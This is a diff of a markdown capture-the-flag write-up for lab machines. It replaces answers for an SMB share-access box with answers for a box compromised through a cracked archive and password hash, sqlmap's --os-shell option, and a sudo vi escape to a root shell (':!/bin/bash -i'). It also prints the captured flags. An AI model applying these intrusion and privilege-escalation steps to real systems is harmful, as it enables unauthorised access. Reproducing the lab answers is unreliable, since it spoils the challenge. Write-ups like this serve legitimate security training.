@@ -41,33 +41,38 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 741852963        (backup.zip)     
 
 ```
-after opening the file we can see:
+We open the file and we can see:
 <img width="1036" height="27" alt="obraz" src="https://github.com/user-attachments/assets/6d2e472e-95be-4e22-8ac1-6de56f20eb38" />
-after out decrypt we get: 
+After out decrypt we get: 
 2cb42f8734ea607eefed3b70af13bbd3 : qwerty789
 
 Answer: **qwerty789**
 
-**4**
-#### Task 6: What is the name of the share we are able to access in the end with a blank password?
-**WorkShares**
-#### Task 7: What is the command we can use within the SMB shell to download the files we find?
-**get**
+#### Task 6: What option can be passed to sqlmap to try to get command execution via the sql injection?
+**--os-shell**
+#### Task 7: What program can the postgres user run as root using sudo?
+Answer: **vi**
 #### Task 8: 
 ```html
-smbclient //<IP:PORT>/WorkShares -N
+postgres@vaccine:/var/lib/postgresql$ cat user.txt
+\cat user.txt
+ec9b13ca4d6229cd5cc1e09980965bf7
+```
+<img width="669" height="75" alt="obraz" src="https://github.com/user-attachments/assets/74999a44-6c57-4994-9755-fc5fac40134c" />
+
+#### Task 9:
+Using vi as root we can type coomand
 ```
 ```html
-smb: \> cd James.P
-smb: \James.P\> ls
-  .                                   D        0  Thu Jun  3 03:38:03 2021
-  ..                                  D        0  Thu Jun  3 03:38:03 2021
-  flag.txt                            A       32  Mon Mar 29 04:26:57 2021
-
-		5114111 blocks of size 4096. 1750230 blocks available
-smb: \James.P\> get flag.txt
-
+:!/bin/bash -i
 ```
-Then the flag was readen:
+And then the flag was readen:
 ```html
-5f61c10dffbc77a704d76016a22f1664
+cat /root/root.txt
+dd6e058e814260bc70e9bbdef2715849
+```
+<img width="627" height="77" alt="obraz" src="https://github.com/user-attachments/assets/62cdc5ff-de9e-4d9e-a6d9-c141dc24038f" />
+
+
+Congratulations!!!!
+
